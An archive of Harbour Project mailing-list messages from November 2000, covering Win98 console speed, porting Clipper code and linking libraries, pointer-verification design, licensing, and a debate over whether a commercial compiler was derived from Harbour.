Message-ID: <3A165F71.7B3E12E0@libero.it>

Hi,

I think that keyboard and cpu releasing under win32 has some problem.
I've ported a little program under win32 (from OS/2), it uses a TBrowse
to show the result of a query to a MySQL server (under linux).

Under OS/2 moving around inside TBrowse object is fast (and I'm using a
90x30 window), under win98 it is a pain (and thanks to this I've found
that TBrowse was redrawing columns header even when not needed :-)) ).

I mean, I press a series of K_UP, it waits at least half a second then
it moves up a few rows _very slowly_ then, all of a sudden, it jumps up
of ten or twenty rows (using buffered keys?).

At this point I've already released my K_UP and the whole process starts
again as soon as I press another movement key.

I suspect that it releases cpu between keys and due to poor multitasking
of win32 this slows everything down.

If someone has an answer I'd like to hear it.

regards.



-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Sat Nov 18 06:58:02 2000
From: harbour@lists.harbour-project.org (Eduardo Rizzolo)
Date: Sat Nov 18 06:58:02 2000
Subject: [Harbour] Varios errores al compilar
References: <20001117153044.V18577@hagbard.davep.org> <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com> <20001117180425.C18577@hagbard.davep.org> <200011172309.eAHN9LG08777@thor.parrett.net>
Message-ID: <003501c0513e$59220d80$0b00a8c0@eduardo>

David

Gracias por responder!!!

Si no entendi mal me decis que tengo que recompilar con Harbour.
Si es asi, no es posible, ya que es una libreria externa entregada por Hasar
Olivetti, y no dispogo de los fuentes.

Gracias

Eduardo Rizzolo
Posadas Misiones Argentina
fullpaint@arnet.com.ar
fullpaint@flashmail.com
icq 39280741

----- Original Message -----
From: David G. Holm <dholm@jsd-llc.com>
To: <harbour@lists.harbour-project.org>
Sent: Friday, November 17, 2000 11:08 PM
Subject: Re: [Harbour] Varios errores al compilar


> ** Reply to message from "Eduardo Rizzolo" <fullpaint@arnet.com.ar> on
> Fri, 17 Nov 2000 19:53:14 -0000
>
> > 4)
> > Utilizo una libreria externa para un controlador fiscal! FISCAL.LIB
> > Con clipper trabaja bien, pero con harbour no encuentro la forma de
> > enlazarla!! Se la agrege al bcc32, pero tira error. Que puedo hacer?
>
> You can't use a library that was written for Clipper with Harbour. The
> library source code must be recompiled using Harbour in order to create
> a library that can be used with Harbour.
> --
> David G. Holm, Set Captain and all around
> Harbour Project Clipper Compatibility fanatic.
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>


From harbour@lists.harbour-project.org  Sat Nov 18 07:15:03 2000
From: harbour@lists.harbour-project.org (Eduardo Rizzolo)
Date: Sat Nov 18 07:15:03 2000
Subject: [Harbour] Varios errores al compilar
References: <20001117153044.V18577@hagbard.davep.org> <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com> <20001117180425.C18577@hagbard.davep.org> <007401c050d0$0b0265a0$0b00a8c0@eduardo> <008e01c05103$a8ba3060$4cf4c4a1@gustavo>
Message-ID: <003b01c05140$c1b07e20$0b00a8c0@eduardo>

Gustavo

gracias por responder!!

Respodo abajo.

Muchas gracias

Eduardo Rizzolo
Posadas Misiones Argentina
fullpaint@arnet.com.ar
fullpaint@flashmail.com
icq 39280741

----- Original Message -----
From: Gustavo A. González M. <gonzalezgustavo@cantv.net>
To: Grupo harbour <harbour@lists.harbour-project.org>
Sent: Saturday, November 18, 2000 2:01 AM
Subject: RE: [Harbour] Varios errores al compilar


> Hola eduardo.
>
> Realmente te recomiendo que no quieras llevar a harbour todo tu programa
de
> un solo golpe.
>
> Recuerda que aunque son identicos, y ya esta casi listo, tienen ciertas
> cositas que debes aprender antes de comenzar a trabajar como si nada.
>
> Te recomiendo que hagas primero pruebas, con un solo prg, luego prueba tus
> definiciones en ese prg, luego comienza a colocarles varios prg y asi

Realmente voy a partir el sistema en pedazos, voy a empesar por descartar
todo lo que tenga que ver con el Impresor Fiscal, ya que parece no tengo
solocion en este punto!!!


> sucesivamente hasta obtener tu objetivo. Usa tu antiguo RMAKE no te des
mala

Para nada, intente hacer unas pruebas de enlace con rmake pero me tiro mas
errores y pense que este tenia problemas.
Si sos tan amable de pasarme un ejemplo de como utilizar con Harbour y
bcc32.  ::)))

> vida con el make de borland (a menos que de verdad quieras y tengas tiempo
> para investigar).

Supuce que se tenia que utilizar este!!! Mi error!!!  ::(((
>
> El RDD no esta 100% completado, pero ya puedes hacer pruebas.
>
> Ademas Eduardo, si llevas todo de un solo jalon, los errores que puedan
> ocurrir van a ser muy dificiles de seguir, y creo que nadie va a analizar
> todo tu codigo para ver cuales son los problemas (sin menospreciar a nadie
> Ok).

Para nada, no es esa mi intencion, solo que se mostraron problemas de
incompativilidad, no graves y a simple vista son dificiles de encontrar.
La sola mencion es para dejar constacia de el, supongo que debe haber un
sector que alla desarrollado esta parte de pre-procesador, y lo podran
corregir.
Pero si nadie te marca el error no va a ser posible la correccion!!!

Entiendo perfectamente las complicaciones de la creacion de esta
herramienta, y para nada son estas consultas criticas, mas bien son
consultas!!


>
> Hazlo por partes y ve soltando igual por partes (en la lista), los errores
> que vayas
> obteniendo (en INGLES my fiend).

I ' m so sorry. Not spiking ingles!!  ::))   Perdon!!!!
Creo que se escribe asi!!!!


>

> Saludos from this side of the earth.
>
> --
> Gustavo A. González M.
> gonzalezgustavo@cantv.net
> Caracas - Venezuela
>
> ----- Original Message -----
> From: Eduardo Rizzolo <fullpaint@arnet.com.ar>
> To: <harbour@lists.harbour-project.org>
> Sent: Friday, November 17, 2000 3:53 PM
> Subject: [Harbour] Varios errores al compilar
>
>
> > Colegas
> >
> > Ante todo disculpas por enviar a una lista para lenguaje ingles, esta
> > consulta en español, pero la lista de español no se mueve!!  :::(((((
> >
> > Efectue la primer compilacion, y tengo los siguientes errores:
> >
> > 1)
> > Esta comparacion no funciono:
> >          IF NUM1 # LINEA->NUMERO
> > Esta no tiene problemas:
> >          IF NUM1 != LINEA->NUMERO
> > 2) Adjunto build.log con detalle de compilacion
> > Tube problemas con el set scope to
> > Reemplace por ordscope() y no tube problemas.
> >
> > 3)
> > Tengo echa esta definicion:
> > #xtranslate T => aArrayVars\[13\]
> > Se confunde e intenta cambiar .T. generando un error.
> > .aArrayVars[13].  // este es el reemplazo efectuado en el ppo
> > Con clipper no hay problema!!
> > Tampoco es muy grave, con solo declarar otra variable se soluciona, pero
> hay
> > problema de incompatibilidad.
> > Seguro que ocurre el mismo error si la variable es F, y se utiliza .F.
> >
> > 4)
> > Utilizo una libreria externa para un controlador fiscal!
> > FISCAL.LIB
> > Con clipper trabaja bien, pero con harbour no encuentro la forma de
> > enlazarla!!
> > Se la agrege al bcc32, pero tira error.
> > Que puedo hacer?
> >
> > 5)
> > Envio los archivos que utilizo de enlace.
> > Me pueden decir si esta bien asi?
> >
> >
> > Muchas gracias
> >
> >
> > Eduardo Rizzolo
> > Posadas Misiones Argentina
> > fullpaint@arnet.com.ar
> > fullpaint@flashmail.com
> > icq 39280741
> >



From harbour@lists.harbour-project.org  Sat Nov 18 09:09:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sat Nov 18 09:09:02 2000
Subject: [Harbour] Random gpfs
Message-ID: <200011180907_MC2-BB4E-62DA@compuserve.com>

Brian,

The underlying idea is to try to find automatically any pointer
problems with data structures - and as soon after the problem occurs
as possible.  It's not actually restricted to pointer problems, but
they do seem the commonest with C.  Especially with lots of people
adding/changing code.  Moving things round at runtime (stack, GC)
just adds more risk. ;-)

OK, we sort of know this. :-)

A way to tame it is to have some common things in every (main) data
structure.  Maybe a size (MS have been learning that, slowly), but
especially a way to know what kind of data structure it's supposed
to be and a way to verify it's intact.  Potentially it could be a
pointer to a function to verify that structure, although if that
pointer gets corrupted things are bad!

OTOH, it would not be unreasonable to have every structure start with
such a pointer (perhaps with a length before it), but not to trust
that pointer.  Each subsystem at startup would register the good value
of its verification pointer with a central function.  Then, whenever
a check is being done, rather than just calling through a pointer a
check would first be made that it matches one of the registered values.
(If there's a length, it can be checked as well.)

It's also possible to add extras of course, such as a signature (a
magic number) that's unique per data structure.

Clearly all this adds overhead (both size & slowness), but it can be
disabled later if it turns out to be too great.

What each registered verification function does is entirely its
choice.  As much in the way of sanity checks as its authors can be
bothered to write. :-)

Suppose we plan to add this, it's a pain to do all at once. :-(  So,
a way to add things a few at a time might be nice.  If we had even a
simple central registering function, and some rules it and the few
verification-enabled subsystems obeyed, it would be enough to start
with.  Initially, few checks would be done.  As more subsystems got
their verifier, more and more would not only be able to do checks but
could also follow pointers in a safe way such that other subsystems
also did their checks.

Got any time "spare"?  Anyone?

John.

From harbour@lists.harbour-project.org  Sat Nov 18 09:35:04 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sat Nov 18 09:35:04 2000
Subject: [Harbour] Harbour license
Message-ID: <200011180933_MC2-BB4E-638F@compuserve.com>

[To Dave Pearson]

"People *must* read the licence."

Agreed.

The C/H/CH/PRG/etc files should not contain much that's license-
related apart from that statement - and something in each file to say
which part of the license it qualifies as.  At the moment there's far
too much, I feel, and some of it is misleading.

---

"That's ok, that's simply output from the compiler. The GPL speaks about
output and I think all we need to do here is clarify the status of the
output."

Agreed.

---

It would be helpful if a small number of files were public domain.
ERRORSYS.PRG, maybe GETSYS.PRG (maybe that spreads to other files?),
and maybe some other files?

John.

From harbour@lists.harbour-project.org  Sat Nov 18 09:52:02 2000
From: harbour@lists.harbour-project.org (=?iso-8859-1?Q?Gustavo_A._Gonz=E1lez_M.?=)
Date: Sat Nov 18 09:52:02 2000
Subject: [Harbour] Varios errores al compilar
References: <20001117153044.V18577@hagbard.davep.org> <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com> <20001117180425.C18577@hagbard.davep.org> <007401c050d0$0b0265a0$0b00a8c0@eduardo> <008e01c05103$a8ba3060$4cf4c4a1@gustavo> <003b01c05140$c1b07e20$0b00a8c0@eduardo>
Message-ID: <00aa01c0516e$b30251e0$4cf4c4a1@gustavo>

Eduardo,

No se porque te esta dando errores el RMAKE, dado que el lo que haces es
ejecutar un comando cuando una regla se cumple o no.

Inicialmente el comando para ti es Clipper.exe ahora es harbour.exe, por eso
no entiendo cual es el error que te da, has la prueba con una rmk mas
sencillo por ejemplo haz una mini aplicacion con tres prg, con tu clipper tu
lincador anterior, cuando este ok, simplemente cambia el clipper.exe por el
harbour.exe y añade las librerias necesarias a medida que el lincador te de
los mensajes de error, claro si buscas el cld.bat, sabras el nombre de las
mismas y listo.

Saludos

----- Original Message -----
From: Eduardo Rizzolo <fullpaint@arnet.com.ar>
To: <harbour@lists.harbour-project.org>
Sent: Saturday, November 18, 2000 5:20 AM
Subject: RE: [Harbour] Varios errores al compilar


> Gustavo
>
> gracias por responder!!
>
> Respodo abajo.
>
> Muchas gracias
>
> Eduardo Rizzolo
> Posadas Misiones Argentina
> fullpaint@arnet.com.ar
> fullpaint@flashmail.com
> icq 39280741
>
> ----- Original Message -----
> From: Gustavo A. González M. <gonzalezgustavo@cantv.net>
> To: Grupo harbour <harbour@lists.harbour-project.org>
> Sent: Saturday, November 18, 2000 2:01 AM
> Subject: RE: [Harbour] Varios errores al compilar
>
>
> > Hola eduardo.
> >
> > Realmente te recomiendo que no quieras llevar a harbour todo tu programa
> de
> > un solo golpe.
> >
> > Recuerda que aunque son identicos, y ya esta casi listo, tienen ciertas
> > cositas que debes aprender antes de comenzar a trabajar como si nada.
> >
> > Te recomiendo que hagas primero pruebas, con un solo prg, luego prueba
tus
> > definiciones en ese prg, luego comienza a colocarles varios prg y asi
>
> Realmente voy a partir el sistema en pedazos, voy a empesar por descartar
> todo lo que tenga que ver con el Impresor Fiscal, ya que parece no tengo
> solocion en este punto!!!
>
>
> > sucesivamente hasta obtener tu objetivo. Usa tu antiguo RMAKE no te des
> mala
>
> Para nada, intente hacer unas pruebas de enlace con rmake pero me tiro mas
> errores y pense que este tenia problemas.
> Si sos tan amable de pasarme un ejemplo de como utilizar con Harbour y
> bcc32.  ::)))
>
> > vida con el make de borland (a menos que de verdad quieras y tengas
tiempo
> > para investigar).
>
> Supuce que se tenia que utilizar este!!! Mi error!!!  ::(((
> >
> > El RDD no esta 100% completado, pero ya puedes hacer pruebas.
> >
> > Ademas Eduardo, si llevas todo de un solo jalon, los errores que puedan
> > ocurrir van a ser muy dificiles de seguir, y creo que nadie va a
analizar
> > todo tu codigo para ver cuales son los problemas (sin menospreciar a
nadie
> > Ok).
>
> Para nada, no es esa mi intencion, solo que se mostraron problemas de
> incompativilidad, no graves y a simple vista son dificiles de encontrar.
> La sola mencion es para dejar constacia de el, supongo que debe haber un
> sector que alla desarrollado esta parte de pre-procesador, y lo podran
> corregir.
> Pero si nadie te marca el error no va a ser posible la correccion!!!
>
> Entiendo perfectamente las complicaciones de la creacion de esta
> herramienta, y para nada son estas consultas criticas, mas bien son
> consultas!!
>
>
> >
> > Hazlo por partes y ve soltando igual por partes (en la lista), los
errores
> > que vayas
> > obteniendo (en INGLES my fiend).
>
> I ' m so sorry. Not spiking ingles!!  ::))   Perdon!!!!
> Creo que se escribe asi!!!!
>
>
> >
>
> > Saludos from this side of the earth.
> >
> > --
> > Gustavo A. González M.
> > gonzalezgustavo@cantv.net
> > Caracas - Venezuela
> >
> > ----- Original Message -----
> > From: Eduardo Rizzolo <fullpaint@arnet.com.ar>
> > To: <harbour@lists.harbour-project.org>
> > Sent: Friday, November 17, 2000 3:53 PM
> > Subject: [Harbour] Varios errores al compilar
> >
> >
> > > Colegas
> > >
> > > Ante todo disculpas por enviar a una lista para lenguaje ingles, esta
> > > consulta en español, pero la lista de español no se mueve!!  :::(((((
> > >
> > > Efectue la primer compilacion, y tengo los siguientes errores:
> > >
> > > 1)
> > > Esta comparacion no funciono:
> > >          IF NUM1 # LINEA->NUMERO
> > > Esta no tiene problemas:
> > >          IF NUM1 != LINEA->NUMERO
> > > 2) Adjunto build.log con detalle de compilacion
> > > Tube problemas con el set scope to
> > > Reemplace por ordscope() y no tube problemas.
> > >
> > > 3)
> > > Tengo echa esta definicion:
> > > #xtranslate T => aArrayVars\[13\]
> > > Se confunde e intenta cambiar .T. generando un error.
> > > .aArrayVars[13].  // este es el reemplazo efectuado en el ppo
> > > Con clipper no hay problema!!
> > > Tampoco es muy grave, con solo declarar otra variable se soluciona,
pero
> > hay
> > > problema de incompatibilidad.
> > > Seguro que ocurre el mismo error si la variable es F, y se utiliza .F.
> > >
> > > 4)
> > > Utilizo una libreria externa para un controlador fiscal!
> > > FISCAL.LIB
> > > Con clipper trabaja bien, pero con harbour no encuentro la forma de
> > > enlazarla!!
> > > Se la agrege al bcc32, pero tira error.
> > > Que puedo hacer?
> > >
> > > 5)
> > > Envio los archivos que utilizo de enlace.
> > > Me pueden decir si esta bien asi?
> > >
> > >
> > > Muchas gracias
> > >
> > >
> > > Eduardo Rizzolo
> > > Posadas Misiones Argentina
> > > fullpaint@arnet.com.ar
> > > fullpaint@flashmail.com
> > > icq 39280741
> > >
>
>
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>


From harbour@lists.harbour-project.org  Sat Nov 18 11:07:02 2000
From: harbour@lists.harbour-project.org (Paul Tucker)
Date: Sat Nov 18 11:07:02 2000
Subject: [Harbour] win98 and TBrowse
References: <3A165F71.7B3E12E0@libero.it>
Message-ID: <000901c05179$58fe7e20$b671fea9@QUARRY>

There is a problem with the console window and speed under Win98 (there is
some interaction with the keyboard - ie: if keys are waiting, it runs as
expected, but if the buffer is empty, it gets real slow for certain screen
operations).  I have not yet put in the proper time to find out the
problem - which I feel is something in Win98 since the same app will work
fine under NT.

Paul
----- Original Message -----
From: "Maurilio Longo" <maurilio.longo@libero.it>
To: <harbour@lists.harbour-project.org>
Sent: Saturday, November 18, 2000 5:52 AM
Subject: [Harbour] win98 and TBrowse


> Hi,
>
> I think that keyboard and cpu releasing under win32 has some problem.
> I've ported a little program under win32 (from OS/2), it uses a TBrowse
> to show the result of a query to a MySQL server (under linux).
>
> Under OS/2 moving around inside TBrowse object is fast (and I'm using a
> 90x30 window), under win98 it is a pain (and thanks to this I've found
> that TBrowse was redrawing columns header even when not needed :-)) ).
>
> I mean, I press a series of K_UP, it waits at least half a second then
> it moves up a few rows _very slowly_ then, all of a sudden, it jumps up
> of ten or twenty rows (using buffered keys?).
>
> At this point I've already released my K_UP and the whole process starts
> again as soon as I press another movement key.
>
> I suspect that it releases cpu between keys and due to poor multitasking
> of win32 this slows everything down.
>
> If someone has an answer I'd like to hear it.
>
> regards.
>
> --
>  __________
> |  |  | |__| md2520@mclink.it
> |_|_|_|____| Team OS/2 Italia



From harbour@lists.harbour-project.org  Sat Nov 18 11:10:02 2000
From: harbour@lists.harbour-project.org (Paul Tucker)
Date: Sat Nov 18 11:10:02 2000
Subject: [Harbour] win98 and TBrowse
References: <3A165F71.7B3E12E0@libero.it> <000901c05179$58fe7e20$b671fea9@QUARRY>
Message-ID: <000501c05179$b740e4f0$b671fea9@QUARRY>

Ok, that was from memory, and I may have it backwards with regards to the
keyboard buffer.

Paul
----- Original Message -----
From: "Paul Tucker" <ptucker@sympatico.ca>
To: <harbour@lists.harbour-project.org>
Sent: Saturday, November 18, 2000 11:05 AM
Subject: Re: [Harbour] win98 and TBrowse


> There is a problem with the console window and speed under Win98 (there is
> some interaction with the keyboard - ie: if keys are waiting, it runs as
> expected, but if the buffer is empty, it gets real slow for certain screen
> operations).  I have not yet put in the proper time to find out the
> problem - which I feel is something in Win98 since the same app will work
> fine under NT.
>
> Paul



From harbour@lists.harbour-project.org  Sat Nov 18 22:54:02 2000
From: harbour@lists.harbour-project.org (April)
Date: Sat Nov 18 22:54:02 2000
Subject: [Harbour] gcc is gpf'ing on me
Message-ID: <3A174EF6.754D8575@user.rose.com>

I just did a check out after many weeks (probably 2 months),
ran make clean and then make.

gcc compiles and creates the common and pp libs okay, but when it tries
to
link harbour.exe using gcc @__link__.tmp it gpf's.

I have been playing with rsxntdj lately, so I made sure than the
djgpp.env settings excluded rsxntdj, did a clean and re-make - same
crash.

I re-set my .env and created a small @file to test with another app - it
worked
okay.

I went into the source\compiler\dos\djgpp dir and ran
    'gcc -o harbour.exe harboury.o'
and this alone gpf'd.

Any suggestions on how to research this?

Thanks.

April


From harbour@lists.harbour-project.org  Sun Nov 19 17:30:04 2000
From: harbour@lists.harbour-project.org (Luiz Rafael Culik Guimaraes)
Date: Sun Nov 19 17:30:04 2000
Subject: [Harbour] Harbour been cracked?
Message-ID: <004d01c05278$2899dfe0$0100007f@sl.conex.net>

Dear Friends

I´ve got the follow information from a Brazilian Harbour/Clipper User

>Após 3 anos desenvolvendo e implementando soluções ERP >com FW, a Microsiga
>(conhece?) desenvolveu internamente (ou adaptou a partir >do Harbour, não
sei
>ainda) a um custo aproximado de 2 milhões de dólares um >compilador de 64
>bits (não acredito neste número. 32 pode ser...) chamado >advPL, ou
Protheus.
>Gera um p-code em C++ que é então compilado com o >Borland C++ 5.0. Claro,
>pode ser compilado em Linux, Solaris ou outros bichos. Soa >familiar?

After 3 years developing and implemented solutions ERP wi FW, the Microsiga
Company(It an Brazilian Software House) has internaly developed( or adapted
from the Harbour) with a cost aproximadally US $ 2 million an 64 bit
compiler ( I don´t belive in this number,32 can be) called advPL, or
Protheus. It generate an P-Code in C++ that is compiled with Borland C++
5.0. It surely that can be compiled under Linux,Solaris and other platforms.
It doesn´t sound that you know.


Regards

Luiz Rafael Culik

Regards from Brazil

Luiz Rafael Culik


From harbour@lists.harbour-project.org  Mon Nov 20 03:35:01 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Mon Nov 20 03:35:01 2000
Subject: [Harbour] Harbour been cracked?
In-Reply-To: <004d01c05278$2899dfe0$0100007f@sl.conex.net>; from culik@nh.conex.com.br on Sun, Nov 19, 2000 at 08:15:55PM -0200
References: <004d01c05278$2899dfe0$0100007f@sl.conex.net>
Message-ID: <20001120072112.T18577@hagbard.davep.org>

On Sun, Nov 19, 2000 at 08:15:55PM -0200, Luiz Rafael Culik Guimaraes wrote:

> After 3 years developing and implemented solutions ERP wi FW, the
> Microsiga Company(It an Brazilian Software House) has internaly developed(
> or adapted from the Harbour) with a cost aproximadally US $ 2 million an
> 64 bit compiler ( I dont belive in this number,32 can be) called advPL, or
> Protheus. It generate an P-Code in C++ that is compiled with Borland C++
> 5.0. It surely that can be compiled under Linux,Solaris and other
> platforms. It doesnt sound that you know.

Can you find out more about this? Note that this isn't "cracked" because
there is no "cracking" to be done. Also note that such a development is
entirely legitimate as long as they've followed the terms of the GPL.

We need to know more.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Mon Nov 20 03:55:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Mon Nov 20 03:55:02 2000
Subject: [Harbour] Select()  but
References: <007601c05019$fa00e120$8604d2cc@san.rr.com> <3A14F891.3A4FC708@imid.med.pl> <002801c050c7$b4a1f200$59f6fbce@local> <3A1595D1.7F9259EF@imid.med.pl>
Message-ID: <002501c052cf$79c47540$8604d2cc@san.rr.com>

Ryszard:
The select() bug (it doesn't handle a string with trailing spaces) could be
fixed locally by trimming the string, but it raises the question of whether
hb_dynsymFindName() should handle this.

Basically the string parameter is passed along to hb_rddSelect and then to
hb_dynsymFindName().  It looks like dbSelectArea will have the same bug.

Should all functions that call this be prepared to trim any symbol names, or
should hb_dynsymFindName either trim them or pad them to the length of a
symbol to search?

Is there a fixed length to symbols if 10char is off???

Brian Hays
Abacus Data Systems, Inc



From harbour@lists.harbour-project.org  Mon Nov 20 04:29:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Mon Nov 20 04:29:02 2000
Subject: [Harbour] diskspace
Message-ID: <003501c052d4$39d2e200$8604d2cc@san.rr.com>

Victor:

Would it be a reasonable extension to let diskspace() receive a drive letter
as an alternative to a number?
Most of us had to drop clipper's function for something like ft_dskfree when
the large drives started to appear, and it takes a letter.

Or would it be better to have a second wrapper function to translate the
letter and perhaps validating the drive by returning -1 instead of throwing
an error on a bad drive reference?

Brian Hays
Abacus Data Systems, Inc



From harbour@lists.harbour-project.org  Mon Nov 20 05:02:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Mon Nov 20 05:02:02 2000
Subject: [Harbour] lookup still becomes undefined
Message-ID: <003d01c052d8$bd0ca530$8604d2cc@san.rr.com>

Ryszard:
I got the latest changes and did a clean rebuild.
My LookUp() function still is callable from anywhere in the large app, but
cannot be found when in a macro expression.

Any ideas?

Brian Hays
Abacus Data Systems, Inc



From harbour@lists.harbour-project.org  Mon Nov 20 05:06:01 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Mon Nov 20 05:06:01 2000
Subject: [Harbour] Select()  but
References: <007601c05019$fa00e120$8604d2cc@san.rr.com> <3A14F891.3A4FC708@imid.med.pl> <002801c050c7$b4a1f200$59f6fbce@local> <3A1595D1.7F9259EF@imid.med.pl> <002501c052cf$79c47540$8604d2cc@san.rr.com>
Message-ID: <026301c052d9$ae6af580$0a0ac8c8@VECWS1>

Brian,


> Ryszard:
> The select() bug (it doesn't handle a string with trailing spaces) could be
> fixed locally by trimming the string, but it raises the question of whether
> hb_dynsymFindName() should handle this.
> 
> Basically the string parameter is passed along to hb_rddSelect and then to
> hb_dynsymFindName().  It looks like dbSelectArea will have the same bug.
>
> Should all functions that call this be prepared to trim any symbol names, or
> should hb_dynsymFindName either trim them or pad them to the length of a
> symbol to search?

Since the vast majority of those calls won't contain trailing spaces, I think 
it would be a waste of time to include trimming. For those specific places 
where the user can specifiy a symbol as a string (like in Select()), the caller 
should make sure to convert to the right form (like trimming surrounding spaces).

Another solution would be to add a wrapper for hb_dynsymFindName() 
which would do a more complete (and slower) conversion for the passed 
symbol string. This has some meaning if the same conversion is needed for 
some other places then Select().

> Is there a fixed length to symbols if 10char is off???

No, but there's an upper limit.

Victor Szakats



From harbour@lists.harbour-project.org  Mon Nov 20 05:09:01 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Mon Nov 20 05:09:01 2000
Subject: [Harbour] diskspace
References: <003501c052d4$39d2e200$8604d2cc@san.rr.com>
Message-ID: <026901c052da$17716730$0a0ac8c8@VECWS1>

Brian,

> Would it be a reasonable extension to let diskspace() receive a drive letter
> as an alternative to a number?
> Most of us had to drop clipper's function for something like ft_dskfree when
> the large drives started to appear, and it takes a letter.
> 
> Or would it be better to have a second wrapper function to translate the
> letter and perhaps validating the drive by returning -1 instead of throwing
> an error on a bad drive reference?

Check HB_DISKSPACE() which does exactly what you say :)

In fact this is the recommended function for Harbour since it has 
some extra features and it works under Linux/Unix, too (while 
DISKSPACE() doesn't).

Victor Szakats



From harbour@lists.harbour-project.org  Mon Nov 20 06:34:02 2000
From: harbour@lists.harbour-project.org (Juan Agustin Barriga)
Date: Mon Nov 20 06:34:02 2000
Subject: [Harbour] Harbour been cracked?
References: <004d01c05278$2899dfe0$0100007f@sl.conex.net> <20001120072112.T18577@hagbard.davep.org>
Message-ID: <003c01c052ed$fd952270$456410ac@jharrier>

Luiz, Dave, All,

        Luiz is completely WRONG. I've been working with Microsiga for five
years now, and believe me, Advpl is quite different from Harbour, it was
developed starting from scratch & has NOTHING of Harbour. As Dave says, this
fact is irrelevant, but still true. Some facts here:
- Advpl is the "languaje" of the Protheus Environment.
- This languaje follows the rules of Clipper 5.2e + Objects.
- The compiler generates p-code that is stored on a repository for the
Protheus Server to run.
- The user interacts with the program through a Thin Client, that talks to
the Server.
- The Server acceses different databases using a TOPConnect client.

So, we have a THREE TIER environment here. A thin client, an Aplication
Server and a Database connector. Nothing could be more different from
Harbour. Stack management uses a List!

Protheus is 100% written in C++, and this is a VERY big difference. (I once
asked why Harbour was not, and the answer was that C++ was a too new
languaje!, and I've been using it for mora than 10 years).

More of this can be found on www.topconnect.cl/paper_dbisback.html hich I
wrote a year ago!

Regards
Harrier


----- Original Message -----
From: "Dave Pearson" <davep@davep.org>
To: <harbour@lists.harbour-project.org>
Sent: Monday, November 20, 2000 3:21 AM
Subject: Re: [Harbour] Harbour been cracked?


> On Sun, Nov 19, 2000 at 08:15:55PM -0200, Luiz Rafael Culik Guimaraes
wrote:
>
> > After 3 years developing and implemented solutions ERP wi FW, the
> > Microsiga Company(It an Brazilian Software House) has internaly
developed(
> > or adapted from the Harbour) with a cost aproximadally US $ 2 million an
> > 64 bit compiler ( I dont belive in this number,32 can be) called advPL,
or
> > Protheus. It generate an P-Code in C++ that is compiled with Borland C++
> > 5.0. It surely that can be compiled under Linux,Solaris and other
> > platforms. It doesnt sound that you know.
>
> Can you find out more about this? Note that this isn't "cracked" because
> there is no "cracking" to be done. Also note that such a development is
> entirely legitimate as long as they've followed the terms of the GPL.
>
> We need to know more.
>
> --
> The Harbour Project: A free software Clipper compatible compiler
> Home Page..........: http://www.harbour-project.org/
> FAQ................: http://www.harbour-project.org/faq/harbour.html
> My harbour page....: http://www.hagbard.demon.co.uk/harbour/
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>



From harbour@lists.harbour-project.org  Mon Nov 20 08:24:02 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Mon Nov 20 08:24:02 2000
Subject: [Harbour] Harbour been cracked?
In-Reply-To: <003c01c052ed$fd952270$456410ac@jharrier>; from harrier@topconnect.cl on Mon, Nov 20, 2000 at 08:32:38AM -0400
References: <004d01c05278$2899dfe0$0100007f@sl.conex.net> <20001120072112.T18577@hagbard.davep.org> <003c01c052ed$fd952270$456410ac@jharrier>
Message-ID: <20001120125753.B18577@hagbard.davep.org>

On Mon, Nov 20, 2000 at 08:32:38AM -0400, Juan Agustin Barriga wrote:

> Protheus is 100% written in C++, and this is a VERY big difference. (I
> once asked why Harbour was not, and the answer was that C++ was a too new
> languaje!, and I've been using it for mora than 10 years).

While you might have been using an implementation of C++ for 10 years you
need to ask yourself the question within the context of a language
*standard* and also think about how widely that standard has been
implemented.

Now ask yourself the same question while thinking about C.

If you took C++ back ten years in time a C++ programmer wouldn't recognise
it.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Mon Nov 20 09:32:02 2000
From: harbour@lists.harbour-project.org (Juan Agustin Barriga)
Date: Mon Nov 20 09:32:02 2000
Subject: [Harbour] Harbour been cracked?
References: <004d01c05278$2899dfe0$0100007f@sl.conex.net> <20001120072112.T18577@hagbard.davep.org> <003c01c052ed$fd952270$456410ac@jharrier> <20001120125753.B18577@hagbard.davep.org>
Message-ID: <000b01c05306$d503f750$456410ac@jharrier>

I've seen C++ evolve over the years with no great impact on my code. And
today I can only think that the language IS STANDARD by all means, as a
proof I can tell you that TOPConnect is running on Win32, Linux, Sun & HPUX
with very few  #ifdefs, that would be there even if it were plain C. So, the
"standardization" is no excuse.
Believe me, the difference between C & C++ is so big in terms of software
expression and even more when evolution & maintenance are accounted. I
wouldn't even think of starting a project on anything but C++.

Regards
Harrier

----- Original Message -----
From: "Dave Pearson" <davep@davep.org>
To: "Harbour Project" <harbour@lists.harbour-project.org>
Sent: Monday, November 20, 2000 8:57 AM
Subject: Re: [Harbour] Harbour been cracked?


